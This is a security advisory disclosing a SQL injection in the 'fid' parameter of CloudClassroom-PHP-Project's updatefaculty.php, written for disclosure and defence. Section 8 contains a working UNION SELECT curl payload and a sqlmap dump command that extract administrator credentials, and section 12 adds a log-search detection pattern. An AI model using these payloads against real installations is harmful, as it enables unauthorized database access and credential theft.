# Security Advisory — SQL Injection in updatefaculty.php (fid parameter)

> **Identifier:** Pending CVE Assignment / Internal ID **CC-2026-04**  
> **Publication Date:** 08/02/2026  
> **Last Updated:** 08/02/2026  
> **Severity:** Critical  
> **CVSS:** 9.1 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`  
> **CWE:** CWE-89: SQL Injection  
> **Status:** Unpatched  

---

## 1. Executive Summary

A vulnerability was identified in **CloudClassroom-PHP-Project 1.0** (Vishal Mathur — `mathurvishal`), in the **updatefaculty.php** component, which allows an attacker (**Authentication: None (via Broken Access Control — item 00; original design requires admin session); User Interaction: None**) to exploit a **SQL Injection (UNION-based / error-based)** flaw.

The numeric parameter `fid` is interpolated without quotes into the `SELECT` query. Within a numeric context, exploitation via `UNION SELECT` is possible. The queried table exposes 9 columns. Confirmed via unauthenticated dumping of administrator credentials.

Successful exploitation can result in **arbitrary database read access (C:H) — PII, plaintext passwords, administrator credentials; write access via UPDATE/POST sink (I:H); total chained system compromise.**

Disclosure follows a responsible/coordinated policy; formal vendor notification is included in the disclosure package (see sections 13 and 14). To date, no patch has been published.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---:|---:|---|
| CloudClassroom-PHP-Project | 1.0 (and prior) | None | Affected |
| Component: updatefaculty.php | 1.0 | None | Affected |

- **Repository / Ecosystem:** https://github.com/mathurvishal/CloudClassroom-PHP-Project
- **Evaluated Stack:** PHP + MySQLi, Apache/2.4.41 (Ubuntu), MariaDB 10.3.39

### Unaffected Products

- No other versions or products were evaluated in this advisory.

---

## 3. Vulnerability Description

The vulnerability occurs due to a **SQL Injection (UNION-based / error-based)** flaw in the **updatefaculty.php** component.

The numeric parameter `fid` is interpolated without quotes into the `SELECT` query. Within a numeric context, exploitation via `UNION SELECT` is possible. The queried table exposes 9 columns. Confirmed via unauthenticated dumping of administrator credentials.

**Root Cause (source code snippet):**

**`updatefaculty.php`**

```php
$x=$_GET['fid'];
$sql="select * from <table> WHERE <col>=$x";
$rs=mysqli_query($connect,$sql);

```

### Necessary Conditions

* Authentication: None (via Broken Access Control — item 00; original design requires admin session)
* User Interaction: None
* Access Vector: Remote (Network) — GET method (+POST on UPDATE)
* Prerequisites: None on the target (item 00). If the original session requirement were enforced, PR would increase and the score would decrease.

---

## 4. Impact

Exploitation may allow:

* Arbitrary database read access (C:H) — PII, plaintext passwords, administrator credentials
* Write access via UPDATE/POST sink (I:H)
* Total chained system compromise

### Impact on Confidentiality

High — an attacker can read sensitive system data (PII, credentials, business data).

### Impact on Integrity

High — data, configurations, or records can be created, altered, or deleted arbitrarily.

### Impact on Availability

None — no direct availability impact.

---

## 5. Classification

### CVSS

* **Score:** 9.1
* **Severity:** Critical
* **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

| Metric | Value |
| --- | --- |
| Attack Vector (AV) | Network (N) |
| Attack Complexity (AC) | Low (L) |
| Privileges Required (PR) | None (N) |
| User Interaction (UI) | None (N) |
| Scope (S) | Unchanged (U) |
| Confidentiality (C) | High (H) |
| Integrity (I) | High (H) |
| Availability (A) | None (N) |

### CWE

* CWE-89: SQL Injection

### CAPEC

* **CAPEC-66 – SQL Injection**

---

## 6. Exploitation Scenario

A potential exploitation scenario occurs as follows:

1. Request `updatefaculty.php` with the `fid` parameter containing the UNION payload (without cookies — item 00).
2. Adjust the column count to 9 (target table) and position the target data within the displayed column.
3. Read the reflected administrator credentials in the server response.
4. Automate with sqlmap (`-p fid`) for a complete database dump.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): updatefaculty.php
Parameter(s): fid
Method: GET (+POST on UPDATE) · Authentication: None (via Broken Access Control — item 00; original design requires admin session)

```

### Sample Request

```http
POST /updatefaculty.php HTTP/1.1
Host: 127.0.0.1:9292
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<session — dispensable via item 00 (Broken Access Control)>

fid=<value>

```

### Observed Response

```text
[admin@ics.com:admin]

```

### Result

Reproduced live in an authorized lab environment (http://127.0.0.1:9292/) on 08/02/2026, in a non-destructive manner. The observed behavior confirms the SQL Injection vulnerability (UNION-based / error-based).

**a) Browser execution** (rendered actual server response with evidence banner):

**b) Vulnerable line of code** (`updatefaculty.php`):

> **Note:** displayed credentials/PII belong to the lab test dataset. Remove real secrets before any external publication.

---

## 8. Proof of Concept

The Proof of Concept below demonstrates only the vulnerable behavior and must be used exclusively in authorized environments. Executable and non-destructive script: **`poc.sh`**.

```bash
curl -s -G "[http://127.0.0.1:9292/updatefaculty.php](http://127.0.0.1:9292/updatefaculty.php)" \
  --data-urlencode "fid=0 UNION SELECT 1,concat(0x5b,Aid,0x3a,Apass,0x5d),3,4,5,6,7,8,9 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"

sqlmap -u "[http://127.0.0.1:9292/updatefaculty.php?fid=1](http://127.0.0.1:9292/updatefaculty.php?fid=1)" -p fid --batch --dump -T admin

```

### Expected Result

```text
[admin@ics.com:admin]
[vishu:vishu]

```

### PoC Limitations

* Does not cause intentional denial of service.
* Does not delete or modify third-party data (state injections are restored; error-based aborts before persisting).
* Does not create persistence or backdoors.
* Does not contain real credentials (test lab data only).
* Does not automate mass exploitation.

---

## 9. Steps to Reproduce

1. Access an instance of **CloudClassroom-PHP-Project 1.0**.
2. Configure prerequisite: None on target (item 00). If original session requirement were enforced, PR increases and score decreases.
3. Access the **updatefaculty.php** component (parameter(s): fid).
4. Send the request/payload described in sections 7 and 8.
5. Observe the vulnerable output: [admin@ics.com:admin]
6. Compare with expected secure behavior (properly validated/sanitized/authorized input, without payload reflection or unauthorized execution).

---

## 10. Mitigation

Until an official fix is applied, the following mitigations are recommended:

* Use prepared statements with parameter binding (`mysqli`/PDO) across 100% of queries.
* Explicitly cast numeric identifiers (`(int)$id`) and use allowlists where applicable.
* Do not output `$sql` or `mysqli_error()` to the client (remove error-based feedback oracles).
* Enforce an `exit;` statement immediately after session authentication guards (see item 00).

Additional compensatory controls:

* Restrict access to the affected component (network/ACL/WAF).
* Apply WAF / reverse proxy rules to block known attack patterns.
* Review associated permissions and privileges; invalidate potentially exposed sessions/credentials.
* Maintain logs and evidence for investigation.

> Mitigations reduce risk but may not completely eliminate the vulnerability.

---

## 11. Remediation

**No official patch available as of the date of this advisory (unpatched product).**

When available, the following steps are recommended:

1. Update to the fixed version or higher.
2. Restart affected services where necessary.
3. Invalidate old sessions and credentials.
4. Review logs prior to the update.
5. Confirm that the vulnerable behavior can no longer be reproduced.

### Recommended Changes for Vendor

* Use prepared statements with parameter binding (`mysqli`/PDO) across 100% of queries.
* Explicitly cast numeric identifiers (`(int)$id`) and use allowlists where applicable.
* Do not output `$sql` or `mysqli_error()` to the client (remove error-based feedback oracles).
* Enforce an `exit;` statement immediately after session authentication guards (see item 00).

---

## 12. Detection and Indicators

Possible indicators of compromise/exploitation:

* Requests to `updatefaculty.php` containing `UNION`, `SELECT`, `extractvalue`, `concat`, single quotes, or `-- ` in the `fid` parameter.
* Database error messages (e.g., `XPATH syntax error`, MariaDB/MySQL errors) reflected in server responses.

### Log Search Example

```text
grep -Ei "(union|select|extractvalue|concat|<script|onerror|onload|</textarea)" access.log | grep "updatefaculty.php"

```

---

## 13. Disclosure Timeline

| Date | Event |
| --- | --- |
| 08/02/2026 | Vulnerability identified (static analysis) |
| 08/02/2026 | Dynamically confirmed in authorized lab |
| 08/02/2026 | Live re-validation with evidence (browser + source code) |
| 08/02/2026 | Disclosure package prepared (this advisory) |
| (pending) | Vendor notification |
| (pending) | CVE requested/reserved |
| (pending) | Patch released |
| (pending) | Advisory publication |

---

## 14. Vendor Communication

* **Vendor:** Vishal Mathur (`mathurvishal`)
* **Channel Used:** Private GitHub Security Advisory in repository / maintainer email (see `VENDOR-EMAIL.md`)
* **Date of First Notification:** (pending)
* **Response Status:** Awaiting notification/reply
* **Vendor Position:** N/A to date

---

## 15. Credits

The vulnerability was identified and reported by:

* **Researcher:** oliveira.luanalmeida@gmail.com and ethical.hacker.tiagoredivo@gmail.com
* **Organization:** Independent Security Research
* **Contact:** oliveira.luanalmeida@gmail.com and ethical.hacker.tiagoredivo@gmail.com

---

## 16. References

* https://cwe.mitre.org/
* https://www.first.org/cvss/calculator/3.1
* https://cvefeed.io/vuln/product/161371/vishalmathurcloudclassroom-php_project/
* https://github.com/mathurvishal/CloudClassroom-PHP-Project
* https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Description |
| --- | --- | --- |
| 1.0 | 08/02/2026 | Initial publication |

---

## 18. Legal Disclaimer

This advisory is published for educational, defensive, and security improvement purposes only.

The information presented was obtained within an authorized environment and disclosed responsibly or in a coordinated manner. The author does not encourage the use of this information for unauthorized access, service disruption, privacy violations, or any illegal activity.

The use of the information contained in this document is at the reader's sole risk.

---

## 19. Contact

For corrections, updates, or additional information:

* **Email:** oliveira.luanalmeida@gmail.com and ethical.hacker.tiagoredivo@gmail.com
* **Repository:** https://github.com/mathurvishal/CloudClassroom-PHP-Project

```
